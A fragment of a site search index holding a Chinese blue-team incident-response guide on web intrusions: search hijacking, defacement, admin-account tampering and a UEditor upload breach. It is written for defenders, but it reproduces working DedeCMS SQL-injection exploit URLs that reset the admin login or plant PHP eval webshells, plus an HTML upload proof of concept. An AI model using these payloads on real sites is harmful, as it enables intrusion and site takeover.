https://262706.com\uff0c\u8df3\u8f6c\u5230\u8d4c\u535a\u7f51\u7ad9\uff1a","title":"\u95ee\u9898\u5904\u7406"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#6","text":"\u5f53\u4f60\u76f4\u63a5\u6253\u5f00\u7f51\u5740\u8bbf\u95ee\u7f51\u7ad9\uff0c\u662f\u6b63\u5e38\u7684\uff0c\u53ef\u662f\u5f53\u4f60\u5728\u641c\u7d22\u5f15\u64ce\u7ed3\u679c\u9875\u4e2d\u6253\u5f00\u7f51\u7ad9\u65f6\uff0c\u4f1a\u8df3\u8f6c\u5230\u4e00\u4e9b\u5176\u4ed6\u7f51\u7ad9\uff0c\u6bd4\u5982\u535a\u5f69\uff0c\u865a\u5047\u5e7f\u544a\uff0c\u6dd8\u5b9d\u641c\u7d22\u9875\u9762\u7b49\u3002\u662f\u7684\uff0c\u4f60\u53ef\u80fd\u4e86\u9047\u5230\u641c\u7d22\u5f15\u64ce\u52ab\u6301\u3002","title":"\u7b2c6\u7bc7\uff1a\u641c\u7d22\u5f15\u64ce\u52ab\u6301"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_12","text":"\u4ece\u641c\u7d22\u5f15\u64ce\u6765\u7684\u6d41\u91cf\u81ea\u52a8\u8df3\u8f6c\u5230\u6307\u5b9a\u7684\u7f51\u9875","title":"\u73b0\u8c61\u63cf\u8ff0"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_13","text":"\u901a\u8fc7\u5bf9index.php\u6587\u4ef6\u8fdb\u884c\u4ee3\u7801\u5206\u6790\uff0c\u53d1\u73b0\u8be5\u6587\u4ef6\u4ee3\u7801 \u5bf9\u6765\u81ea\u641c\u72d7\u548c\u597d\u641c\u7684\u8bbf\u95ee\u8fdb\u884c\u6d41\u91cf\u52ab\u6301\u3002 \u8fdb\u4e00\u6b65\u8ddf\u7740include\u51fd\u6570\u5305\u542b\u7684\u6587\u4ef6\uff0cindex,php\u5305\u542b/tmp/.ICE-unix/.. /c.jpg\u3002 \u8fdb\u5165/tmp\u76ee\u5f55\u8fdb\u884c\u67e5\u770b\uff0c\u53d1\u73b0\u8be5\u76ee\u5f55\u4e0b\uff0c\u5982c.jpg\u7b49\u6587\u4ef6\uff0c\u5305\u542b\u7740\u4e00\u5957\u535a\u5f69\u52ab\u6301\u7684\u7a0b\u5e8f\u3002","title":"\u95ee\u9898\u5904\u7406"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#7","text":"\u7f51\u7ad9\u9996\u9875\u88ab\u975e\u6cd5\u7be1\u6539\uff0c\u662f\u7684\uff0c\u5c31\u662f\u4f60\u4e00\u6253\u5f00\u7f51\u7ad9\u5c31\u77e5\u9053\u81ea\u5df1\u7684\u7f51\u7ad9\u51fa\u73b0\u4e86\u5b89\u5168\u95ee\u9898\uff0c\u7f51\u7ad9\u7a0b\u5e8f\u5b58\u5728\u4e25\u91cd\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u4e0a\u4f20\u811a\u672c\u6728\u9a6c\uff0c\u4ece\u800c\u5bf9\u7f51\u7ad9\u5185\u5bb9\u8fdb\u884c\u7be1\u6539\u3002\u800c\u8fd9\u79cd\u7be1\u6539\u4e8b\u4ef6\u5728\u67d0\u4e9b\u573a\u666f\u4e0b\uff0c\u4f1a\u88ab\u65e0\u9650\u653e\u5927\u3002","title":"\u7b2c7\u7bc7\uff1a\u7f51\u7ad9\u9996\u9875\u88ab\u7be1\u6539"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_14","text":"\u7f51\u7ad9\u9996\u9875\u88ab\u6076\u610f\u7be1\u6539\uff0c\u6bd4\u5982\u590d\u5236\u539f\u6765\u7684\u56fe\u7247\uff0cPS\u4e00\u4e0b\uff0c\u7136\u540e\u66ff\u6362\u4e0a\u53bb\u3002","title":"\u73b0\u8c61\u63cf\u8ff0"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_15","text":"1\u3001 \u786e\u8ba4\u7be1\u6539\u65f6\u95f4 \u901a\u8fc7\u5bf9\u88ab\u7be1\u6539\u7684\u56fe\u7247\u8fdb\u884c\u67e5\u770b\uff0c\u786e\u8ba4\u56fe\u7247\u7be1\u6539\u65f6\u95f4\u4e3a2018\u5e7404\u670818\u65e5 19:24:07 \u3002 2\u3001\u8bbf\u95ee\u65e5\u5fd7\u6eaf\u6e90 \u901a\u8fc7\u56fe\u7247\u4fee\u6539\u7684\u65f6\u95f4\u8282\u70b9\uff0c\u53d1\u73b0\u53ef\u7591IP\uff1a113.xx.xx.24 \uff08\u4ee3\u7406IP\uff0c\u65e0\u6cd5\u8ffd\u6eaf\u771f\u5b9e\u6765\u6e90\uff09\uff0c\u8bbf\u95eeimage.jsp\uff08\u811a\u672c\u6728\u9a6c\uff09\uff0c\u5e76\u968f\u540e\u8bbf\u95ee\u4e86\u88ab\u7be1\u6539\u7684\u56fe\u7247\u5730\u5740\u3002 \u8fdb\u4e00\u6b65\u5ba1\u67e5\u6240\u6709\u7684\u65e5\u5fd7\u6587\u4ef6(\u65e5\u5fd7\u4fdd\u5b58\u65f6\u95f4\u4ece2017-04-20\u81f32018-04-19)\uff0c\u53d1\u73b0\u4e00\u5171\u53ea\u6709\u4e24\u6b21\u8bbf\u95eeimage.jsp\u6587\u4ef6\u7684\u8bb0\u5f55\uff0c\u5206\u522b\u662f2018-04-18\u548c2017-09-21\u3002 image.jsp\u57282017-09-21\u4e4b\u524d\u5c31\u5df2\u7ecf\u4e0a\u4f20\u5230\u7f51\u7ad9\u670d\u52a1\u5668\uff0c\u5df2\u7ecf\u6f5c\u85cf\u957f\u8fbe\u534a\u5e74\u591a\u751a\u81f3\u66f4\u4e45\u7684\u65f6\u95f4\u3002 3\u3001\u5bfb\u627e\u771f\u76f8 \u6211\u4eec\u5728\u7f51\u7ad9\u6839\u76ee\u5f55\u627e\u5230\u4e86\u7b54\u6848\uff0c\u53d1\u73b0\u7ad9\u70b9\u76ee\u5f55\u4e0b\u5b58\u5728ROOT.rar\u5168\u7ad9\u6e90\u7801\u5907\u4efd\u6587\u4ef6\uff0c\u5907\u4efd\u65f6\u95f4\u4e3a2017-02-28 10:35\u3002 \u901a\u8fc7\u5bf9ROOT.rar\u89e3\u538b\u7f29\uff0c\u53d1\u73b0\u6e90\u7801\u4e2d\u5b58\u5728\u7684\u811a\u672c\u6728\u9a6c\u4e0e\u7f51\u7ad9\u8bbf\u95ee\u65e5\u5fd7\u7684\u53ef\u7591\u6587\u4ef6\u540d\u4e00\u81f4\uff08image.jsp\uff09\u3002 \u6839\u636e\u8fd9\u51e0\u4e2a\u65f6\u95f4\u8282\u70b9\uff0c\u6211\u4eec\u5c1d\u8bd5\u53bb\u8fd8\u539f\u653b\u51fb\u8005\u7684\u653b\u51fb\u8def\u5f84\u3002 \u4f46\u662f\u6211\u4eec\u5728\u8bbf\u95ee\u65e5\u5fd7\u5e76\u672a\u627e\u5230ROOT.rar\u7684\u8bbf\u95ee\u4e0b\u8f7d\u8bb0\u5f55\uff0c\u8bbf\u95ee\u65e5\u5fd7\u53ea\u4fdd\u7559\u4e86\u8fd1\u4e00\u5e74\u7684\u8bb0\u5f55\uff0c\u800c\u8fd9\u4e2awebshell\u53ef\u80fd\u5df2\u7ecf\u5b58\u5728\u4e86\u591a\u5e74\u3002 \u9ed1\u5ba2\u662f\u5982\u4f55\u83b7\u53d6webshell\u7684\u5462\uff1f \u53ef\u80fd\u662f\u901a\u8fc7\u4e0b\u8f7dROOT.rar\u5168\u7ad9\u6e90\u7801\u5907\u4efd\u6587\u4ef6\u83b7\u53d6\u5230\u5176\u4e2d\u5b58\u5728\u7684\u6728\u9a6c\u4fe1\u606f\uff0c\u6216\u8005\u51e0\u5e74\u524d\u5165\u4fb5\u5e76\u6f5c\u85cf\u4e86\u591a\u5e74\uff0c\u53c8\u6216\u8005\u662f\u4ece\u5730\u4e0b\u9ed1\u4ea7\u8d2d\u4e70\u4e86shell\uff0c\u6211\u4eec\u4e0d\u5f97\u800c\u77e5\u3002 \u672c\u6587\u7684\u793a\u4f8b\u4e2d\u653b\u51fb\u8005\u4e3a\u6211\u4eec\u7559\u4e0b\u4e86\u5927\u91cf\u7684\u8bc1\u636e\u548c\u8bb0\u5f55\uff0c\u800c\u66f4\u591a\u65f6\u5019\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6e05\u9664\u6240\u6709\u7684\u5173\u952e\u4fe1\u606f\uff0c\u8fd9\u52bf\u5fc5\u4f1a\u52a0\u5927\u8c03\u67e5\u4eba\u5458\u7684\u53d6\u8bc1\u96be\u5ea6\u3002","title":"\u95ee\u9898\u5904\u7406"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#8","text":"\u4f60\u662f\u67d0\u4e00\u4e2a\u7f51\u7ad9\u7684\u7ba1\u7406\u5458\uff0c\u6709\u4e00\u5929\uff0c\u4f60\u7684\u7ba1\u7406\u5458\u8d26\u53f7admin\u5374\u767b\u5f55\u4e0d\u4e86\uff0c\u8fdb\u5165\u6570\u636e\u5e93\u67e5\u770b\uff0c\u539f\u6765\u7ba1\u7406\u5458\u8d26\u53f7\u7528\u6237\u540d\u4e0d\u5b58\u5728\u4e86\uff0c\u5374\u591a\u4e86\u53e6\u5916\u4e00\u4e2a\u7ba1\u7406\u5458\u7528\u6237\u540d\u3002\u4e0d\u5bf9\uff0c\u4e0d\u662f\u65b0\u589e\u4e86\u7ba1\u7406\u5458\uff0c\u800c\u662f\u4f60\u7684\u7ba1\u7406\u5458\u7528\u6237\u540d\u88ab\u7be1\u6539\u4e86\u3002","title":"\u7b2c8\u7bc7\uff1a\u7ba1\u7406\u5458\u8d26\u53f7\u88ab\u7be1\u6539"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_16","text":"\u524d\u540e\u7aef\u5206\u79bb\uff0c\u540e\u53f0\u53ea\u5141\u8bb8\u5185\u7f51\u8bbf\u95ee\uff0c\u7ba1\u7406\u5458\u8d26\u53f7admin\u5374\u4f9d\u7136\u88ab\u591a\u6b21\u88ab\u7be1\u6539","title":"\u73b0\u8c61\u63cf\u8ff0"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_17","text":"1\u3001\u7f51\u7ad9webshell \u5728\u9488\u5bf9\u7f51\u7ad9\u6839\u76ee\u5f55\u8fdb\u884cwebshell\u626b\u63cf\uff0c\u53d1\u73b0\u5b58\u5728\u811a\u672c\u6728\u9a6c\uff0c\u521b\u5efa\u65f6\u95f4\u4e3a2018-06-13 04:30:30 2\u3001 \u5b9a\u4f4dIP \u901a\u8fc7\u6728\u9a6c\u521b\u5efa\u65f6\u95f4\uff0c \u67e5\u770b\u7f51\u7ad9\u8bbf\u95ee\u65e5\u5fd7\uff0c\u5b9a\u4f4d\u5230IP\u4e3a\uff1a180.xx.xx.3 3\u3001\u5173\u8054\u5206\u6790 \u5168\u5c40\u641c\u7d22\u4e0e\u8be5IP\u6709\u5173\u7684\u64cd\u4f5c\u65e5\u5fd7\uff1a \u5728\u811a\u672c\u6728\u9a6c\u751f\u6210\u524d\uff0c\u6709\u4e24\u6761\u6bd4\u8f83\u53ef\u7591\u7684\u8bbf\u95ee\u65e5\u5fd7\u5438\u5f15\u4e86\u6211\u4eec\u7684\u6ce8\u610f\uff1a 172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800] \"GET /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=114&arrs2[]=101&arrs2[]=97&arrs2[]=100&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 HTTP/1.1\" 200 67 172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800] \"GET /plus/ad_js.php?aid=19 HTTP/1.1\" 200 32 \u5bf9\u8fd9\u6bb5POC\u8fdb\u884c\u89e3\u7801\uff0c\u6211\u4eec\u53d1\u73b0\u901a\u8fc7\u8fd9\u4e2apoc\u53ef\u4ee5\u5f80\u6570\u636e\u5e93\u4e2d\u63d2\u5165\u6570\u636e\uff0c\u8fdb\u4e00\u6b65\u8bbf\u95ee/plus/ad_js.php?aid=19 \u5373\u53ef\u5728plus\u76ee\u5f55\u751f\u6210read.php\u811a\u672c\u6587\u4ef6\u3002 \u89e3\u7801\u540e\uff1a cfg_dbprefixmyad SET normbody = '<?php file_put_contents(''read.php'',''<?php eval($_POST[x]);echo mOon;?>'');?>' WHERE aid` =19 # \u7efc\u4e0a\uff0c\u53ef\u4ee5\u63a8\u6d4b/plus/download.php\u4e2d\u53ef\u80fd\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u63a5\u4e0b\u6765\uff0c\u6536\u96c6\u7f51\u4e0a\u5df2\u516c\u5f00\u7684\u6709\u4ee5\u4e0b3\u79cdEXP\u8fdb\u884c\u6f0f\u6d1e\u590d\u73b0\u3002","title":"\u95ee\u9898\u5904\u7406"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_18","text":"\u5229\u7528\u65b9\u5f0f\u4e00\uff1a\u4fee\u6539\u540e\u53f0\u7ba1\u7406\u5458 1\u3001\u65b0\u5efa\u7ba1\u7406\u5458\u8d26\u53f7test/test123789\uff0c\u53ef\u4ee5\u6210\u529f\u767b\u5f55\u7f51\u7ad9\u540e\u53f0 2\u3001\u6784\u9020\u5982\u4e0b\u6ce8\u5165SQL\u8bed\u53e5\uff1a cfg_dbprefixadmin SETuserid='spider',pwd`='f297a57a5a743894a0e4' where id=19 # \u4fee\u6539\u540e\u53f0\u7ba1\u7406\u5458\u4e3a\uff1a\u7528\u6237\u540dspider\uff0c\u5bc6\u7801admin\u3002 \uff083\uff09\u5bf9\u5e94\u7684EXP: \uff1fopen=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=97&arrs2[]=100&arrs2[]=109&arrs2[]=105&arrs2[]=110&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=117&arrs2[]=115&arrs2[]=101&arrs2[]=114&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=61&arrs2[]=39&arrs2[]=115&arrs2[]=112&arrs2[]=105&arrs2[]=100&arrs2[]=101&arrs2[]=114&arrs2[]=39&arrs2[]=44&arrs2[]=32&arrs2[]=96&arrs2[]=112&arrs2[]=119&arrs2[]=100&arrs2[]=96&arrs2[]=61&arrs2[]=39&arrs2[]=102&arrs2[]=50&arrs2[]=57&arrs2[]=55&arrs2[]=97&arrs2[]=53&arrs2[]=55&arrs2[]=97&arrs2[]=53&arrs2[]=97&arrs2[]=55&arrs2[]=52&arrs2[]=51&arrs2[]=56&arrs2[]=57&arrs2[]=52&arrs2[]=97&arrs2[]=48&arrs2[]=101&arrs2[]=52&arrs2[]=39&arrs2[]=32&arrs2[]=119&arrs2[]=104&arrs2[]=101&arrs2[]=114&arrs2[]=101&arrs2[]=32&arrs2[]=105&arrs2[]=100&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 \u6267\u884cEXP\u540e\uff0c\u76f8\u5e94\u540e\u53f0\u6570\u636e\u5e93\u8868\u53d8\u4e3a\u5982\u4e0b\uff1a \uff084\uff09\u56e0\u6b64\u76f8\u5e94\u540e\u53f0\u767b\u5f55\u7528\u6237\u53d8\u4e3aspider\u5bc6\u7801admin \u5229\u7528\u65b9\u5f0f\u4e8c\uff1a\u901a\u8fc7/plus/mytag_js.php\u6587\u4ef6\u751f\u6210\u4e00\u53e5\u8bdd\u6728\u9a6cphp \uff081\uff09\u5982\uff1a\u6784\u9020\u5982\u4e0b\u6ce8\u5165SQL\u8bed\u53e5\uff1a `cfg_dbprefixmytag(aid,expbody,normbody) VALUES(9013,@\\','{dede:php}file_put_contents(''90sec.php'',''<?php eval($_POST[guige]);?>'');{/dede:php}') # @\\'`` \uff082\uff09\u5bf9\u5e94\u7684EXP: ?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=101&arrs2[]=120&arrs2[]=112&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=49&arrs2[]=51&arrs2[]=44&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96&arrs2[]=44&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=41&arrs2[]=32&arrs2[]=35&arrs2[]=32&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96 \uff083\uff09\u6267\u884cEXP\u540e\uff0c\u5c06\u5411\u6570\u636e\u5e93\u8868dede_mytag\u4e2d\u63d2\u5165\u4e00\u6761\u8bb0\u5f55\uff0c \uff084\uff09\u6267\u884c\u5982\u4e0b\u8bed\u53e5\uff0c\u5728/plus\u76ee\u5f55\u4e0b\u751f\u621090sec.php\u4e00\u53e5\u8bdd\u6728\u9a6c http://www.xxxx.com/plus/mytag_js.php?aid=9013 \u5229\u7528\u65b9\u5f0f\u4e09\uff1a\u4f7f/plus/ad_js.php\u6587\u4ef6\u53d8\u4e3a\u4e00\u53e5\u8bdd\u6728\u9a6cphp \uff081\uff09\u5982\uff1a\u6784\u9020\u5982\u4e0b\u6ce8\u5165SQL\u8bed\u53e5\uff1a cfg_dbprefixmyadSETnormbody= '<?php file_put_contents(''read.php'',''<?php eval($_POST[x]);echo mOon;?>'');?>' WHEREaid` =19 # \uff082\uff09\u5bf9\u5e94\u7684EXP: /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=114&arrs2[]=101&arrs2[]=97&arrs2[]=100&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 \uff083\uff09\u6267\u884cEXP\u540e\uff0c\u5c06\u5411\u6570\u636e\u5e93\u8868dede_myad\u4e2d\u63d2\u5165\u4e00\u6761\u8bb0\u5f55\u3002 \uff084\uff09\u8fdb\u4e00\u6b65\u8bbf\u95ee/plus/ad_js.php?aid=19 \u5373\u53ef\u5728plus\u76ee\u5f55\u751f\u6210read.php\u811a\u672c\u6587\u4ef6\u3002 \u5982\u4f55\u6e05\u9664\uff1f 1\u3001\u5220\u9664\u7f51\u7ad9\u76ee\u5f55\u4e2d\u7684webshell 2\u3001\u6e05\u9664dede_myad\u3001dede_mytag\u6570\u636e\u5e93\u8868\u4e2d\u63d2\u5165\u7684SQL\u8bed\u53e5\uff0c\u9632\u6b62\u518d\u6b21\u88ab\u8c03\u7528\u751f\u6210webshell\u3002 \u5982\u4f55\u9632\u5fa1\uff1f \u7f51\u7ad9\u91c7\u7528\u5f00\u6e90CMS\u642d\u5efa\uff0c\u5efa\u8bae\u53ca\u65f6\u5bf9\u5b98\u65b9\u53d1\u5e03\u7684\u7cfb\u7edf\u8865\u4e01\u4ee5\u53ca\u5185\u6838\u7248\u672c\u8fdb\u884c\u5347\u7ea7\u3002","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#9","text":"UEditor\u662f\u767e\u5ea6\u7684\u4e00\u4e2ajavascript\u7f16\u8f91\u5668\u7684\u5f00\u6e90\u9879\u76ee\uff0c\u5f88\u591a\u5f00\u53d1\u4eba\u5458\u90fd\u559c\u6b22\u5f15\u7528\u8fd9\u4e2a\u7f16\u8f91\u5668\uff0c\u4f46\u8fd9\u4e2a\u7f16\u8f91\u5668\u5b98\u7f51\u7248\u672c\u4e00\u76f4\u505c\u7559\u57282016-05-26\uff0c\u5df2\u7ecf\u5f88\u4e45\u6ca1\u6709\u66f4\u65b0\u4e86\u3002","title":"\u7b2c9\u7bc7\uff1a\u7f16\u8f91\u5668\u5165\u4fb5\u4e8b\u4ef6"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#0x01","text":"HIDS\u9884\u8b66\uff1a\u53d1\u73b0\u540e\u95e8(Webshell)\u6587\u4ef6\uff0c\u5efa\u8bae\u60a8\u7acb\u5373\u8fdb\u884c\u5904\u7406\u3002","title":"0x01 \u73b0\u8c61\u63cf\u8ff0"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#0x02","text":"1\u3001\u53d1\u73b0Webshell \u901a\u8fc7\u9884\u8b66\u4fe1\u606f\uff0c\u627e\u5230\u6728\u9a6c\u6587\u4ef6\u8def\u5f84\uff1a \u5907\u6ce8\uff1a\u7d27\u6025\u5904\u7406\uff0c\u901a\u8fc7\u7981\u6b62\u52a8\u6001\u811a\u672c\u5728\u4e0a\u4f20\u76ee\u5f55\u7684\u8fd0\u884c\u6743\u9650\uff0c\u4f7fwebshell\u65e0\u6cd5\u6210\u529f\u6267\u884c\u3002 2\u3001\u5b9a\u4f4d\u6587\u4ef6\u4e0a\u4f20\u65f6\u95f4 \u6839\u636eWebshell\u6587\u4ef6\u521b\u5efa\u65f6\u95f4\uff0c2020\u5e743\u67089\u65e5 15:08:34 3\u3001 Web\u8bbf\u95ee\u65e5\u5fd7\u5173\u8054\u5206\u6790 \u7531\u4e8e\uff0cIIS\u65e5\u5fd7\u65f6\u95f4\u4e0e\u7cfb\u7edf\u65f6\u95f4\u76f8\u5dee8\u5c0f\u65f6\uff0c\u7cfb\u7edf\u65f6\u95f4\u662f15:08\uff0c\u6211\u4eec\u8fd9\u91cc\u67e5\u770b\u7684\u662f 7:08\u7684\u65e5\u5fd7\u65f6\u95f4\u3002 2020-03-09 07:08:34 10.215.2.128 POST /ueditor/net/controller.ashx action=catchimage ................... ................... 2020-03-09 07:08:35 10.215.2.128 POST /ueditor/net/controller.ashx action=catchimage \u627e\u5230\u5bf9\u5e94\u7684\u7f51\u7ad9\u8bbf\u95ee\u65e5\u5fd7\uff0c\u5728\u6587\u4ef6\u521b\u5efa\u65f6\u95f4\u9694\u95f4\u91cc\uff0c\u6211\u4eec\u4f1a\u6ce8\u610f\u5230\u8fd9\u6837\u4e24\u4e2aueditor\u7684\u8bbf\u95ee\u8bf7\u6c42\uff0c\u521d\u6b65\u6000\u7591\u662fUEditor\u7f16\u8f91\u5668\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u3002 4\u3001\u672c\u5730\u6f0f\u6d1e\u590d\u73b0 A\u3001\u672c\u5730\u6784\u5efa\u4e00\u4e2ahtml <form action=\"http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage\"enctype=\"application/x-www-form-urlencoded\" method=\"POST\"> <p>shell addr:<input type=\"text\" name=\"source[]\" /></p > <inputtype=\"submit\" value=\"Submit\" /> </form> B\u3001\u4e0a\u4f20webshell\uff0c\u4e0a\u4f20\u6210\u529f \u7ecf\u6f0f\u6d1e\u590d\u73b0\uff0c\u786e\u8ba4UEditor\u7f16\u8f91\u5668\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u3002 